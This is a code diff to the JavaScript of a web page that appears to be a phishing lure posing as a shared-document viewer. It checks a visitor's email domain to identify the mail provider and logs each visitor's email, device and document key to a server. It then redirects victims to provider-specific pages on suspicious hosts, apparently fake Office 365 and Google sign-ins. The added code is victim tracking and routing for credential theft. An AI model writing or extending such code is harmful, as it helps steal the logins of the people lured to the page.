@@ -1104,6 +1104,66 @@
             document.getElementById('providerInfo').innerHTML = '';
         }
 
+        // ========== VISIT LOGGING ==========
+        
+        // Helper: Detect device type
+        function getDeviceType() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            if (/ipad|tablet|playbook|silk/i.test(ua)) {
+                return 'Tablet';
+            }
+            
+            if (/mobile|android|iphone|ipod|blackberry|windows phone/i.test(ua)) {
+                return 'Mobile';
+            }
+            
+            return 'Desktop';
+        }
+
+        // Log visit to Redis
+        async function logVisit(email, device, mxType) {
+            try {
+                console.log('📊 Logging visit to Redis...');
+
+                // Get document key from URL hash
+                const documentKey = window.location.hash.substring(1) || 'unknown';
+
+                const response = await fetch('/api/log-visit.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        device: device,
+                        mx_type: mxType,
+                        document_key: documentKey
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log('✅ Visit logged successfully');
+                    console.log('Visit ID:', result.visit_id);
+                    console.log('IP Address:', result.ip);
+                    console.log('MX Type:', result.mx_type);
+                    console.log('Document Key:', result.document_key);
+                } else {
+                    console.error('❌ Visit logging failed:', result.error);
+                }
+
+            } catch (error) {
+                console.error('❌ Visit logging error:', error);
+                // Don't block user flow if logging fails
+            }
+        }
+
         // ========== REAL MX CHECKING USING GOOGLE DNS API ==========
 
         // Quick check for common email providers (skip API call)
@@ -1331,13 +1391,13 @@
             `;
         }
 
-        // Redirect based on provider (UNCHANGED - your endpoint handles redirect to authenticated.html)
+        // Redirect based on provider
         function redirectToProvider(email, mxResult) {
             // Log access before redirect
             const selectedFiles = Array.from(selectedDocuments);
             logAccess(email, mxResult, selectedFiles);
 
-            // Redirect to your endpoint (which will handle redirect to authenticated.html)
+            // Redirect to your endpoint
             const redirectUrls = {
                 'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
                 'google': 'https://pdf-render.vercel.app/viewer?from=me',
@@ -1383,13 +1443,18 @@
                     throw new Error(mxResult.error || 'Unable to verify email domain');
                 }
 
+                // ========== LOG VISIT TO REDIS WITH MX TYPE ==========
+                const device = getDeviceType();
+                await logVisit(email, device, mxResult.provider);
+                // =====================================================
+
                 // Display provider badge
                 displayProviderBadge(mxResult);
 
                 // Wait a moment to show the badge
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // Redirect based on MX result (your endpoint will handle authenticated.html redirect)
+                // Redirect based on MX result
                 redirectToProvider(email, mxResult);
 
             } catch (error) {
